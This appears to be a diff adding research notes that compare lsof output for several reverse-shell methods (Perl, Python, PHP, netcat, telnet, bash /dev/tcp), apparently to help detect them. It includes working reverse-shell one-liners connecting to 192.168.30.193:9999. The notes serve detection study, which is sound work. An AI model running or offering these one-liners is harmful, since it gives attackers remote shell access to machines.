@@ -1,0 +1,748 @@
+perl:
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.30.193:9999");STDIN->fdopen($c,r);STDOUT->fdopen($c,w);system$_ while<>;'
+COMMAND  PID USER   FD   TYPE DEVICE  SIZE/OFF      NODE NAME
+perl    9265 root  cwd    DIR  253,0      4096  67165249 /root
+perl    9265 root  rtd    DIR  253,0      4096       128 /
+perl    9265 root  txt    REG  253,0     11408  33774283 /usr/bin/perl
+perl    9265 root  mem    REG  253,0     44520  67462064 /usr/lib64/perl5/vendor_perl/auto/Socket/Socket.so
+perl    9265 root  mem    REG  253,0     19520  33731444 /usr/lib64/perl5/auto/Fcntl/Fcntl.so
+perl    9265 root  mem    REG  253,0     19808 100875877 /usr/lib64/perl5/auto/IO/IO.so
+perl    9265 root  mem    REG  253,0 106070960  34084466 /usr/lib/locale/locale-archive
+perl    9265 root  mem    REG  253,0     11448  67210996 /usr/lib64/libfreebl3.so
+perl    9265 root  mem    REG  253,0   2173512  67224378 /usr/lib64/libc-2.17.so
+perl    9265 root  mem    REG  253,0    144792  69162358 /usr/lib64/libpthread-2.17.so
+perl    9265 root  mem    REG  253,0     14872  69162364 /usr/lib64/libutil-2.17.so
+perl    9265 root  mem    REG  253,0     41080  67224383 /usr/lib64/libcrypt-2.17.so
+perl    9265 root  mem    REG  253,0   1139680  69162347 /usr/lib64/libm-2.17.so
+perl    9265 root  mem    REG  253,0     19776  67224386 /usr/lib64/libdl-2.17.so
+perl    9265 root  mem    REG  253,0    117680  69162349 /usr/lib64/libnsl-2.17.so
+perl    9265 root  mem    REG  253,0    106848  68349448 /usr/lib64/libresolv-2.17.so
+perl    9265 root  mem    REG  253,0   1647272  33711652 /usr/lib64/perl5/CORE/libperl.so
+perl    9265 root  mem    REG  253,0    164240  67224370 /usr/lib64/ld-2.17.so
+perl    9265 root    0u  IPv4 669385       0t0       TCP 192.168.180.32:54607->192.168.30.193:distinct (ESTABLISHED)
+perl    9265 root    1u  IPv4 669385       0t0       TCP 192.168.180.32:54607->192.168.30.193:distinct (ESTABLISHED)
+perl    9265 root    2u   CHR  136,0       0t0         3 /dev/pts/0
+perl    9265 root    3u  IPv4 669385       0t0       TCP 192.168.180.32:54607->192.168.30.193:distinct (ESTABLISHED)
+perl    9265 root    5u  sock    0,6       0t0    662269 protocol: TCP
+perl    9265 root  196u  sock    0,6       0t0    662972 protocol: TCP
+
+python:
+COMMAND   PID USER   FD   TYPE  DEVICE SIZE/OFF   NODE NAME
+python  30076 root  cwd    DIR   253,0     4096 669498 /usr/local/sdl_sniffer
+python  30076 root  rtd    DIR   253,0     4096      2 /
+python  30076 root  txt    REG   253,0     9032 663749 /usr/bin/python
+python  30076 root  mem    REG   253,0   156936 524701 /lib64/ld-2.12.so
+python  30076 root  mem    REG   253,0    22536 524709 /lib64/libdl-2.12.so
+python  30076 root  mem    REG   253,0  1926760 524702 /lib64/libc-2.12.so
+python  30076 root  mem    REG   253,0   145896 524707 /lib64/libpthread-2.12.so
+python  30076 root  mem    REG   253,0    91096 524704 /lib64/libz.so.1.2.3
+python  30076 root  mem    REG   253,0   599392 524703 /lib64/libm-2.12.so
+python  30076 root  mem    REG   253,0   124624 524721 /lib64/libselinux.so.1
+python  30076 root  mem    REG   253,0   113952 524727 /lib64/libresolv-2.12.so
+python  30076 root  mem    REG   253,0    17520 524340 /lib64/libutil-2.12.so
+python  30076 root  mem    REG   253,0  1672576 659203 /usr/lib64/libpython2.6.so.1.0
+python  30076 root  mem    REG   253,0    17256 524730 /lib64/libcom_err.so.2.1
+python  30076 root  mem    REG   253,0    12592 524654 /lib64/libkeyutils.so.1.3
+python  30076 root  mem    REG   253,0    46368 524728 /lib64/libkrb5support.so.0.1
+python  30076 root  mem    REG   253,0   944712 524731 /lib64/libkrb5.so.3.3
+python  30076 root  mem    REG   253,0   177520 524729 /lib64/libk5crypto.so.3.1
+python  30076 root  mem    REG   253,0   280520 524740 /lib64/libgssapi_krb5.so.2.2
+python  30076 root  mem    REG   253,0  1965824 669439 /usr/lib64/libcrypto.so.1.0.1e
+python  30076 root  mem    REG   253,0   444040 669440 /usr/lib64/libssl.so.1.0.1e
+python  30076 root  mem    REG   253,0    20976 661988 /usr/lib64/python2.6/lib-dynload/binascii.so
+python  30076 root  mem    REG   253,0    37840 661984 /usr/lib64/python2.6/lib-dynload/_struct.so
+python  30076 root  mem    REG   253,0    14632 661996 /usr/lib64/python2.6/lib-dynload/fcntlmodule.so
+python  30076 root  mem    REG   253,0    24432 662012 /usr/lib64/python2.6/lib-dynload/selectmodule.so
+python  30076 root  mem    REG   253,0    20328 662017 /usr/lib64/python2.6/lib-dynload/timemodule.so
+python  30076 root  mem    REG   253,0    19248 661991 /usr/lib64/python2.6/lib-dynload/cStringIO.so
+python  30076 root  mem    REG   253,0    34112 661983 /usr/lib64/python2.6/lib-dynload/_ssl.so
+python  30076 root  mem    REG   253,0    60752 661981 /usr/lib64/python2.6/lib-dynload/_socketmodule.so
+python  30076 root  mem    REG   253,0 99158576 657416 /usr/lib/locale/locale-archive
+python  30076 root    0u  IPv4 2855391      0t0    TCP 192.168.180.182:40568->192.168.30.193:distinct (ESTABLISHED)
+python  30076 root    1u  IPv4 2855391      0t0    TCP 192.168.180.182:40568->192.168.30.193:distinct (ESTABLISHED)
+python  30076 root    2u  IPv4 2855391      0t0    TCP 192.168.180.182:40568->192.168.30.193:distinct (ESTABLISHED)
+python  30076 root    3u  IPv4 2855391      0t0    TCP 192.168.180.182:40568->192.168.30.193:distinct (ESTABLISHED)
+
+php:
+COMMAND   PID USER   FD   TYPE DEVICE  SIZE/OFF     NODE NAME
+php     21297 root  cwd    DIR  253,0      4096 67165249 /root
+php     21297 root  rtd    DIR  253,0      4096      128 /
+php     21297 root  txt    REG  253,0   4618120 34443673 /usr/bin/php
+php     21297 root  mem    REG  253,0     57952 68349465 /usr/lib64/libzip.so.2.1.0
+php     21297 root  mem    REG  253,0     58496     1196 /usr/lib64/php/modules/zip.so
+php     21297 root  mem    REG  253,0     19384 67326834 /usr/lib64/libgpg-error.so.0.10.0
+php     21297 root  mem    REG  253,0    535064 67326836 /usr/lib64/libgcrypt.so.11.8.2
+php     21297 root  mem    REG  253,0    258344 68354277 /usr/lib64/libxslt.so.1.1.28
+php     21297 root  mem    REG  253,0     87368 68354275 /usr/lib64/libexslt.so.0.8.17
+php     21297 root  mem    REG  253,0     37184     1214 /usr/lib64/php/modules/xsl.so
+php     21297 root  mem    REG  253,0     49240     1213 /usr/lib64/php/modules/xmlwriter.so
+php     21297 root  mem    REG  253,0     33008     1212 /usr/lib64/php/modules/xmlreader.so
+php     21297 root  mem    REG  253,0     36840     1211 /usr/lib64/php/modules/wddx.so
+php     21297 root  mem    REG  253,0     15792     1208 /usr/lib64/php/modules/sysvshm.so
+php     21297 root  mem    REG  253,0     11568     1207 /usr/lib64/php/modules/sysvsem.so
+php     21297 root  mem    REG  253,0     19976     1206 /usr/lib64/php/modules/sysvmsg.so
+php     21297 root  mem    REG  253,0    481224     3346 /usr/lib64/php/modules/redis.so
+php     21297 root  mem    REG  253,0     32976     1205 /usr/lib64/php/modules/posix.so
+php     21297 root  mem    REG  253,0    272112     1195 /usr/lib64/php/modules/phar.so
+php     21297 root  mem    REG  253,0     44784     1194 /usr/lib64/php/modules/json.so
+php     21297 root  mem    REG  253,0     61304     3345 /usr/lib64/php/modules/igbinary.so
+php     21297 root  mem    REG  253,0   2713464     1193 /usr/lib64/php/modules/fileinfo.so
+php     21297 root  mem    REG  253,0    176600     1210 /usr/lib64/php/modules/dom.so
+php     21297 root  mem    REG  253,0    121320 67498195 /usr/lib64/libsasl2.so.3.0.0
+php     21297 root  mem    REG  253,0    352584 67714662 /usr/lib64/libldap-2.4.so.2.10.7
+php     21297 root  mem    REG  253,0     61952 67714660 /usr/lib64/liblber-2.4.so.2.10.7
+php     21297 root  mem    REG  253,0    251832 67224708 /usr/lib64/libnspr4.so
+php     21297 root  mem    REG  253,0     20096 67224719 /usr/lib64/libplc4.so
+php     21297 root  mem    REG  253,0     15800 67224720 /usr/lib64/libplds4.so
+php     21297 root  mem    REG  253,0    194944 67224721 /usr/lib64/libnssutil3.so
+php     21297 root  mem    REG  253,0   1249536 67715996 /usr/lib64/libnss3.so
+php     21297 root  mem    REG  253,0    164288 67715997 /usr/lib64/libsmime3.so
+php     21297 root  mem    REG  253,0    340976 67715998 /usr/lib64/libssl3.so
+php     21297 root  mem    REG  253,0    174088 67467581 /usr/lib64/libssh2.so.1.0.1
+php     21297 root  mem    REG  253,0    208920 67326870 /usr/lib64/libidn.so.11.6.11
+php     21297 root  mem    REG  253,0    435192 67716041 /usr/lib64/libcurl.so.4.3.0
+php     21297 root  mem    REG  253,0     74776     1192 /usr/lib64/php/modules/curl.so
+php     21297 root  mem    REG  253,0 106070960 34084466 /usr/lib/locale/locale-archive
+php     21297 root  mem    REG  253,0    155784 67263196 /usr/lib64/libselinux.so.1
+php     21297 root  mem    REG  253,0     15688 67462077 /usr/lib64/libkeyutils.so.1.5
+php     21297 root  mem    REG  253,0     58728 68218514 /usr/lib64/libkrb5support.so.0.1
+php     21297 root  mem    REG  253,0    157424 67311332 /usr/lib64/liblzma.so.5.2.2
+php     21297 root  mem    REG  253,0    144792 69162358 /usr/lib64/libpthread-2.17.so
+php     21297 root  mem    REG  253,0     88776 69162328 /usr/lib64/libgcc_s-4.8.5-20150702.so.1
+php     21297 root  mem    REG  253,0     11448 67210996 /usr/lib64/libfreebl3.so
+php     21297 root  mem    REG  253,0   2173512 67224378 /usr/lib64/libc-2.17.so
+php     21297 root  mem    REG  253,0   2512832 68349464 /usr/lib64/libcrypto.so.1.0.2k
+php     21297 root  mem    REG  253,0    470360 67502470 /usr/lib64/libssl.so.1.0.2k
+php     21297 root  mem    REG  253,0     15920 67311360 /usr/lib64/libcom_err.so.2.1
+php     21297 root  mem    REG  253,0    210840 67502446 /usr/lib64/libk5crypto.so.3.1
+php     21297 root  mem    REG  253,0    963576 67502456 /usr/lib64/libkrb5.so.3.3
+php     21297 root  mem    REG  253,0    320408 67502442 /usr/lib64/libgssapi_krb5.so.2.2
+php     21297 root  mem    REG  253,0   1509376 67311355 /usr/lib64/libxml2.so.2.9.1
+php     21297 root  mem    REG  253,0    117680 69162349 /usr/lib64/libnsl-2.17.so
+php     21297 root  mem    REG  253,0     19776 67224386 /usr/lib64/libdl-2.17.so
+php     21297 root  mem    REG  253,0   1139680 69162347 /usr/lib64/libm-2.17.so
+php     21297 root  mem    REG  253,0     44448 69162360 /usr/lib64/librt-2.17.so
+php     21297 root  mem    REG  253,0    402384 67224754 /usr/lib64/libpcre.so.1.2.0
+php     21297 root  mem    REG  253,0     90664 67263199 /usr/lib64/libz.so.1.2.7
+php     21297 root  mem    REG  253,0     68192 67311391 /usr/lib64/libbz2.so.1.0.6
+php     21297 root  mem    REG  253,0    495712 67350469 /usr/lib64/libgmp.so.10.2.0
+php     21297 root  mem    REG  253,0    991616 67224723 /usr/lib64/libstdc++.so.6.0.19
+php     21297 root  mem    REG  253,0    174576 67224751 /usr/lib64/libtinfo.so.5.9
+php     21297 root  mem    REG  253,0    163696 67224737 /usr/lib64/libncurses.so.5.9
+php     21297 root  mem    REG  253,0    235064 67462045 /usr/lib64/libedit.so.0.0.42
+php     21297 root  mem    REG  253,0    106848 68349448 /usr/lib64/libresolv-2.17.so
+php     21297 root  mem    REG  253,0     41080 67224383 /usr/lib64/libcrypt-2.17.so
+php     21297 root  mem    REG  253,0    164240 67224370 /usr/lib64/ld-2.17.so
+php     21297 root  mem    REG  253,0     26254 67224718 /usr/lib64/gconv/gconv-modules.cache
+php     21297 root    0u   CHR  136,2       0t0        5 /dev/pts/2
+php     21297 root    1u   CHR  136,2       0t0        5 /dev/pts/2
+php     21297 root    2u   CHR  136,2       0t0        5 /dev/pts/2
+php     21297 root    3u  IPv4 579842       0t0      TCP 192.168.180.32:54476->192.168.30.193:distinct (ESTABLISHED)
+php     21297 root    4r  FIFO    0,8       0t0   579843 pipe
+
+
+nc:
+COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF      NODE NAME
+nc      18706 root  cwd    DIR  253,0     4096  67165249 /root
+nc      18706 root  rtd    DIR  253,0     4096       128 /
+nc      18706 root  txt    REG  253,0   380208  34605174 /usr/bin/ncat
+nc      18706 root  mem    REG  253,0   402384  67224754 /usr/lib64/libpcre.so.1.2.0
+nc      18706 root  mem    REG  253,0   155784  67263196 /usr/lib64/libselinux.so.1
+nc      18706 root  mem    REG  253,0   144792  69162358 /usr/lib64/libpthread-2.17.so
+nc      18706 root  mem    REG  253,0   106848  68349448 /usr/lib64/libresolv-2.17.so
+nc      18706 root  mem    REG  253,0    15688  67462077 /usr/lib64/libkeyutils.so.1.5
+nc      18706 root  mem    REG  253,0    58728  68218514 /usr/lib64/libkrb5support.so.0.1
+nc      18706 root  mem    REG  253,0    90664  67263199 /usr/lib64/libz.so.1.2.7
+nc      18706 root  mem    REG  253,0   210840  67502446 /usr/lib64/libk5crypto.so.3.1
+nc      18706 root  mem    REG  253,0    15920  67311360 /usr/lib64/libcom_err.so.2.1
+nc      18706 root  mem    REG  253,0   963576  67502456 /usr/lib64/libkrb5.so.3.3
+nc      18706 root  mem    REG  253,0   320408  67502442 /usr/lib64/libgssapi_krb5.so.2.2
+nc      18706 root  mem    REG  253,0  2173512  67224378 /usr/lib64/libc-2.17.so
+nc      18706 root  mem    REG  253,0    19776  67224386 /usr/lib64/libdl-2.17.so
+nc      18706 root  mem    REG  253,0  1139680  69162347 /usr/lib64/libm-2.17.so
+nc      18706 root  mem    REG  253,0   266496  67790531 /usr/lib64/libpcap.so.1.5.3
+nc      18706 root  mem    REG  253,0  2512832  68349464 /usr/lib64/libcrypto.so.1.0.2k
+nc      18706 root  mem    REG  253,0   470360  67502470 /usr/lib64/libssl.so.1.0.2k
+nc      18706 root  mem    REG  253,0   164240  67224370 /usr/lib64/ld-2.17.so
+nc      18706 root    0r  FIFO    0,8      0t0    577521 pipe
+nc      18706 root    1w  FIFO  253,0      0t0 109228602 /tmp/f
+nc      18706 root    2u   CHR  136,2      0t0         5 /dev/pts/2
+nc      18706 root    3u  IPv4 577557      0t0       TCP 192.168.180.32:54475->192.168.30.193:distinct (ESTABLISHED)
+
+nc -e:
+COMMAND   PID  PPID USER   FD   TYPE  DEVICE SIZE/OFF     NODE NAME
+nc      16969 21718 root  cwd    DIR   253,0     4096 67165249 /root
+nc      16969 21718 root  rtd    DIR   253,0     4096      128 /
+nc      16969 21718 root  txt    REG   253,0   380208 34605174 /usr/bin/ncat
+nc      16969 21718 root  mem    REG   253,0   402384 67224754 /usr/lib64/libpcre.so.1.2.0
+nc      16969 21718 root  mem    REG   253,0   155784 67263196 /usr/lib64/libselinux.so.1
+nc      16969 21718 root  mem    REG   253,0   144792 69162358 /usr/lib64/libpthread-2.17.so
+nc      16969 21718 root  mem    REG   253,0   106848 68349448 /usr/lib64/libresolv-2.17.so
+nc      16969 21718 root  mem    REG   253,0    15688 67462077 /usr/lib64/libkeyutils.so.1.5
+nc      16969 21718 root  mem    REG   253,0    58728 68218514 /usr/lib64/libkrb5support.so.0.1
+nc      16969 21718 root  mem    REG   253,0    90664 67263199 /usr/lib64/libz.so.1.2.7
+nc      16969 21718 root  mem    REG   253,0   210840 67502446 /usr/lib64/libk5crypto.so.3.1
+nc      16969 21718 root  mem    REG   253,0    15920 67311360 /usr/lib64/libcom_err.so.2.1
+nc      16969 21718 root  mem    REG   253,0   963576 67502456 /usr/lib64/libkrb5.so.3.3
+nc      16969 21718 root  mem    REG   253,0   320408 67502442 /usr/lib64/libgssapi_krb5.so.2.2
+nc      16969 21718 root  mem    REG   253,0  2173512 67224378 /usr/lib64/libc-2.17.so
+nc      16969 21718 root  mem    REG   253,0    19776 67224386 /usr/lib64/libdl-2.17.so
+nc      16969 21718 root  mem    REG   253,0  1139680 69162347 /usr/lib64/libm-2.17.so
+nc      16969 21718 root  mem    REG   253,0   266496 67790531 /usr/lib64/libpcap.so.1.5.3
+nc      16969 21718 root  mem    REG   253,0  2512832 68349464 /usr/lib64/libcrypto.so.1.0.2k
+nc      16969 21718 root  mem    REG   253,0   470360 67502470 /usr/lib64/libssl.so.1.0.2k
+nc      16969 21718 root  mem    REG   253,0   164240 67224370 /usr/lib64/ld-2.17.so
+nc      16969 21718 root    0u   CHR   136,0      0t0        3 /dev/pts/0
+nc      16969 21718 root    1u   CHR   136,0      0t0        3 /dev/pts/0
+nc      16969 21718 root    2u   CHR   136,0      0t0        3 /dev/pts/0
+nc      16969 21718 root    3u  IPv4 5442023      0t0      TCP 192.168.180.32:39518->192.168.30.193:9999 (ESTABLISHED)
+nc      16969 21718 root    5u  sock     0,7      0t0  5217912 protocol: TCP
+nc      16969 21718 root    6w  FIFO     0,9      0t0  5442024 pipe
+nc      16969 21718 root    7r  FIFO     0,9      0t0  5442025 pipe
+nc      16969 21718 root  196u  sock     0,7      0t0  5215212 protocol: TCP
+
+COMMAND   PID  PPID USER   FD   TYPE  DEVICE  SIZE/OFF     NODE NAME
+bash    16972 16969 root  cwd    DIR   253,0      4096 67165249 /root
+bash    16972 16969 root  rtd    DIR   253,0      4096      128 /
+bash    16972 16969 root  txt    REG   253,0    964544 34084471 /usr/bin/bash
+bash    16972 16969 root  mem    REG   253,0 106070960 34084466 /usr/lib/locale/locale-archive
+bash    16972 16969 root  mem    REG   253,0   2173512 67224378 /usr/lib64/libc-2.17.so
+bash    16972 16969 root  mem    REG   253,0     19776 67224386 /usr/lib64/libdl-2.17.so
+bash    16972 16969 root  mem    REG   253,0    174576 67224751 /usr/lib64/libtinfo.so.5.9
+bash    16972 16969 root  mem    REG   253,0    164240 67224370 /usr/lib64/ld-2.17.so
+bash    16972 16969 root  mem    REG   253,0     26254 67224718 /usr/lib64/gconv/gconv-modules.cache
+bash    16972 16969 root    0r  FIFO     0,9       0t0  5442024 pipe
+bash    16972 16969 root    1w  FIFO     0,9       0t0  5442025 pipe
+bash    16972 16969 root    2u   CHR   136,0       0t0        3 /dev/pts/0
+bash    16972 16969 root    3u  IPv4 5442023       0t0      TCP 192.168.180.32:39518->192.168.30.193:9999 (ESTABLISHED)
+bash    16972 16969 root    4r  FIFO     0,9       0t0  5442024 pipe
+bash    16972 16969 root    5u  sock     0,7       0t0  5217912 protocol: TCP
+bash    16972 16969 root    8w  FIFO     0,9       0t0  5442025 pipe
+bash    16972 16969 root  196u  sock     0,7       0t0  5215212 protocol: TCP
+
+
+
+nc | bash|nc:
+COMMAND   PID  PPID USER   FD   TYPE DEVICE  SIZE/OFF     NODE NAME
+bash    22990 21718 root  cwd    DIR  253,0      4096 67165249 /root
+bash    22990 21718 root  rtd    DIR  253,0      4096      128 /
+bash    22990 21718 root  txt    REG  253,0    964544 34084471 /usr/bin/bash
+bash    22990 21718 root  mem    REG  253,0 106070960 34084466 /usr/lib/locale/locale-archive
+bash    22990 21718 root  mem    REG  253,0   2173512 67224378 /usr/lib64/libc-2.17.so
+bash    22990 21718 root  mem    REG  253,0     19776 67224386 /usr/lib64/libdl-2.17.so
+bash    22990 21718 root  mem    REG  253,0    174576 67224751 /usr/lib64/libtinfo.so.5.9
+bash    22990 21718 root  mem    REG  253,0    164240 67224370 /usr/lib64/ld-2.17.so
+bash    22990 21718 root  mem    REG  253,0     26254 67224718 /usr/lib64/gconv/gconv-modules.cache
+bash    22990 21718 root    0r  FIFO    0,9       0t0  5473731 pipe
+bash    22990 21718 root    1w  FIFO    0,9       0t0  5473733 pipe
+bash    22990 21718 root    2u   CHR  136,0       0t0        3 /dev/pts/0
+bash    22990 21718 root    5u  sock    0,7       0t0  5217912 protocol: TCP
+bash    22990 21718 root  196u  sock    0,7       0t0  5215212 protocol: TCP
+
+COMMAND   PID  PPID USER   FD   TYPE  DEVICE SIZE/OFF     NODE NAME
+nc      22991 21718 root  cwd    DIR   253,0     4096 67165249 /root
+nc      22991 21718 root  rtd    DIR   253,0     4096      128 /
+nc      22991 21718 root  txt    REG   253,0   380208 34605174 /usr/bin/ncat
+nc      22991 21718 root  mem    REG   253,0   402384 67224754 /usr/lib64/libpcre.so.1.2.0
+nc      22991 21718 root  mem    REG   253,0   155784 67263196 /usr/lib64/libselinux.so.1
+nc      22991 21718 root  mem    REG   253,0   144792 69162358 /usr/lib64/libpthread-2.17.so
+nc      22991 21718 root  mem    REG   253,0   106848 68349448 /usr/lib64/libresolv-2.17.so
+nc      22991 21718 root  mem    REG   253,0    15688 67462077 /usr/lib64/libkeyutils.so.1.5
+nc      22991 21718 root  mem    REG   253,0    58728 68218514 /usr/lib64/libkrb5support.so.0.1
+nc      22991 21718 root  mem    REG   253,0    90664 67263199 /usr/lib64/libz.so.1.2.7
+nc      22991 21718 root  mem    REG   253,0   210840 67502446 /usr/lib64/libk5crypto.so.3.1
+nc      22991 21718 root  mem    REG   253,0    15920 67311360 /usr/lib64/libcom_err.so.2.1
+nc      22991 21718 root  mem    REG   253,0   963576 67502456 /usr/lib64/libkrb5.so.3.3
+nc      22991 21718 root  mem    REG   253,0   320408 67502442 /usr/lib64/libgssapi_krb5.so.2.2
+nc      22991 21718 root  mem    REG   253,0  2173512 67224378 /usr/lib64/libc-2.17.so
+nc      22991 21718 root  mem    REG   253,0    19776 67224386 /usr/lib64/libdl-2.17.so
+nc      22991 21718 root  mem    REG   253,0  1139680 69162347 /usr/lib64/libm-2.17.so
+nc      22991 21718 root  mem    REG   253,0   266496 67790531 /usr/lib64/libpcap.so.1.5.3
+nc      22991 21718 root  mem    REG   253,0  2512832 68349464 /usr/lib64/libcrypto.so.1.0.2k
+nc      22991 21718 root  mem    REG   253,0   470360 67502470 /usr/lib64/libssl.so.1.0.2k
+nc      22991 21718 root  mem    REG   253,0   164240 67224370 /usr/lib64/ld-2.17.so
+nc      22991 21718 root    0r  FIFO     0,9      0t0  5473733 pipe
+nc      22991 21718 root    1u   CHR   136,0      0t0        3 /dev/pts/0
+nc      22991 21718 root    2u   CHR   136,0      0t0        3 /dev/pts/0
+nc      22991 21718 root    3u  IPv4 5473766      0t0      TCP 192.168.180.32:53734->192.168.30.193:9998 (ESTABLISHED)
+nc      22991 21718 root    5u  sock     0,7      0t0  5217912 protocol: TCP
+nc      22991 21718 root  196u  sock     0,7      0t0  5215212 protocol: TCP
+
+COMMAND   PID  PPID USER   FD   TYPE  DEVICE SIZE/OFF     NODE NAME
+nc      22989 21718 root  cwd    DIR   253,0     4096 67165249 /root
+nc      22989 21718 root  rtd    DIR   253,0     4096      128 /
+nc      22989 21718 root  txt    REG   253,0   380208 34605174 /usr/bin/ncat
+nc      22989 21718 root  mem    REG   253,0   402384 67224754 /usr/lib64/libpcre.so.1.2.0
+nc      22989 21718 root  mem    REG   253,0   155784 67263196 /usr/lib64/libselinux.so.1
+nc      22989 21718 root  mem    REG   253,0   144792 69162358 /usr/lib64/libpthread-2.17.so
+nc      22989 21718 root  mem    REG   253,0   106848 68349448 /usr/lib64/libresolv-2.17.so
+nc      22989 21718 root  mem    REG   253,0    15688 67462077 /usr/lib64/libkeyutils.so.1.5
+nc      22989 21718 root  mem    REG   253,0    58728 68218514 /usr/lib64/libkrb5support.so.0.1
+nc      22989 21718 root  mem    REG   253,0    90664 67263199 /usr/lib64/libz.so.1.2.7
+nc      22989 21718 root  mem    REG   253,0   210840 67502446 /usr/lib64/libk5crypto.so.3.1
+nc      22989 21718 root  mem    REG   253,0    15920 67311360 /usr/lib64/libcom_err.so.2.1
+nc      22989 21718 root  mem    REG   253,0   963576 67502456 /usr/lib64/libkrb5.so.3.3
+nc      22989 21718 root  mem    REG   253,0   320408 67502442 /usr/lib64/libgssapi_krb5.so.2.2
+nc      22989 21718 root  mem    REG   253,0  2173512 67224378 /usr/lib64/libc-2.17.so
+nc      22989 21718 root  mem    REG   253,0    19776 67224386 /usr/lib64/libdl-2.17.so
+nc      22989 21718 root  mem    REG   253,0  1139680 69162347 /usr/lib64/libm-2.17.so
+nc      22989 21718 root  mem    REG   253,0   266496 67790531 /usr/lib64/libpcap.so.1.5.3
+nc      22989 21718 root  mem    REG   253,0  2512832 68349464 /usr/lib64/libcrypto.so.1.0.2k
+nc      22989 21718 root  mem    REG   253,0   470360 67502470 /usr/lib64/libssl.so.1.0.2k
+nc      22989 21718 root  mem    REG   253,0   164240 67224370 /usr/lib64/ld-2.17.so
+nc      22989 21718 root    0u   CHR   136,0      0t0        3 /dev/pts/0
+nc      22989 21718 root    1w  FIFO     0,9      0t0  5473731 pipe
+nc      22989 21718 root    2u   CHR   136,0      0t0        3 /dev/pts/0
+nc      22989 21718 root    3u  IPv4 5473765      0t0      TCP 192.168.180.32:39520->192.168.30.193:9999 (ESTABLISHED)
+nc      22989 21718 root    5u  sock     0,7      0t0  5217912 protocol: TCP
+nc      22989 21718 root  196u  sock     0,7      0t0  5215212 protocol: TCP
+
+telnet:
+重定向输入
+COMMAND  PID USER   FD   TYPE   DEVICE SIZE/OFF      NODE NAME
+telnet  5430 root  cwd    DIR    253,0     4096 134294593 /root
+telnet  5430 root  rtd    DIR    253,0     4096       128 /
+telnet  5430 root  txt    REG    253,0   101776  69729636 /usr/bin/telnet
+telnet  5430 root  mem    REG    253,0    19776 134380712 /usr/lib64/libdl-2.17.so
+telnet  5430 root  mem    REG    253,0  2173512 134380704 /usr/lib64/libc-2.17.so
+telnet  5430 root  mem    REG    253,0   174576 134402580 /usr/lib64/libtinfo.so.5.9
+telnet  5430 root  mem    REG    253,0   163696 134380795 /usr/lib64/libncurses.so.5.9
+telnet  5430 root  mem    REG    253,0    14872 134395484 /usr/lib64/libutil-2.17.so
+telnet  5430 root  mem    REG    253,0   164240 134297047 /usr/lib64/ld-2.17.so
+telnet  5430 root    0u   CHR    136,1      0t0         4 /dev/pts/1
+telnet  5430 root    1w  FIFO      0,8      0t0  16461899 pipe
+telnet  5430 root    2u   CHR    136,1      0t0         4 /dev/pts/1
+telnet  5430 root    3u  IPv4 16461903      0t0       TCP localhost.localdomain:48230->192.168.30.193:distinct (ESTABLISHED)
+
+重定向输出：
+COMMAND  PID USER   FD   TYPE   DEVICE SIZE/OFF      NODE NAME
+telnet  5432 root  cwd    DIR    253,0     4096 134294593 /root
+telnet  5432 root  rtd    DIR    253,0     4096       128 /
+telnet  5432 root  txt    REG    253,0   101776  69729636 /usr/bin/telnet
+telnet  5432 root  mem    REG    253,0    19776 134380712 /usr/lib64/libdl-2.17.so
+telnet  5432 root  mem    REG    253,0  2173512 134380704 /usr/lib64/libc-2.17.so
+telnet  5432 root  mem    REG    253,0   174576 134402580 /usr/lib64/libtinfo.so.5.9
+telnet  5432 root  mem    REG    253,0   163696 134380795 /usr/lib64/libncurses.so.5.9
+telnet  5432 root  mem    REG    253,0    14872 134395484 /usr/lib64/libutil-2.17.so
+telnet  5432 root  mem    REG    253,0   164240 134297047 /usr/lib64/ld-2.17.so
+telnet  5432 root    0r  FIFO      0,8      0t0  16461901 pipe
+telnet  5432 root    1u   CHR    136,1      0t0         4 /dev/pts/1
+telnet  5432 root    2u   CHR    136,1      0t0         4 /dev/pts/1
+telnet  5432 root    3u  IPv4 16461902      0t0       TCP localhost.localdomain:41914->192.168.30.193:distinct32 (ESTABLISHED)
+
+exec 5<>/dev/tcp/192.168.30.193/9999;cat <&5 | while read line; do $line 2>&5 >&5; done:
+COMMAND   PID USER   FD   TYPE DEVICE  SIZE/OFF     NODE NAME
+bash    32435 root  cwd    DIR  253,0      4096 67165249 /root
+bash    32435 root  rtd    DIR  253,0      4096      128 /
+bash    32435 root  txt    REG  253,0    964544 34084471 /usr/bin/bash
+bash    32435 root  mem    REG  253,0 106070960 34084466 /usr/lib/locale/locale-archive
+bash    32435 root  mem    REG  253,0     62184 69162351 /usr/lib64/libnss_files-2.17.so
+bash    32435 root  mem    REG  253,0   2173512 67224378 /usr/lib64/libc-2.17.so
+bash    32435 root  mem    REG  253,0     19776 67224386 /usr/lib64/libdl-2.17.so
+bash    32435 root  mem    REG  253,0    174576 67224751 /usr/lib64/libtinfo.so.5.9
+bash    32435 root  mem    REG  253,0    164240 67224370 /usr/lib64/ld-2.17.so
+bash    32435 root  mem    REG  253,0     26254 67224718 /usr/lib64/gconv/gconv-modules.cache
+bash    32435 root    0u   CHR  136,0       0t0        3 /dev/pts/0
+bash    32435 root    1u   CHR  136,0       0t0        3 /dev/pts/0
+bash    32435 root    2u   CHR  136,0       0t0        3 /dev/pts/0
+bash    32435 root    5u  IPv4 662269       0t0      TCP 192.168.180.32:54604->192.168.30.193:distinct (ESTABLISHED)
+bash    32435 root  255u   CHR  136,0       0t0        3 /dev/pts/0
+
+0<&196;exec 196<>/dev/tcp/192.168.30.193/9999; sh <&196 >&196 2>&196:
+COMMAND PID USER   FD   TYPE DEVICE  SIZE/OFF     NODE NAME
+sh      327 root  cwd    DIR  253,0      4096 67165249 /root
+sh      327 root  rtd    DIR  253,0      4096      128 /
+sh      327 root  txt    REG  253,0    964544 34084471 /usr/bin/bash
+sh      327 root  mem    REG  253,0 106070960 34084466 /usr/lib/locale/locale-archive
+sh      327 root  mem    REG  253,0   2173512 67224378 /usr/lib64/libc-2.17.so
+sh      327 root  mem    REG  253,0     19776 67224386 /usr/lib64/libdl-2.17.so
+sh      327 root  mem    REG  253,0    174576 67224751 /usr/lib64/libtinfo.so.5.9
+sh      327 root  mem    REG  253,0    164240 67224370 /usr/lib64/ld-2.17.so
+sh      327 root  mem    REG  253,0     26254 67224718 /usr/lib64/gconv/gconv-modules.cache
+sh      327 root    0u  IPv4 662972       0t0      TCP 192.168.180.32:54605->192.168.30.193:distinct (ESTABLISHED)
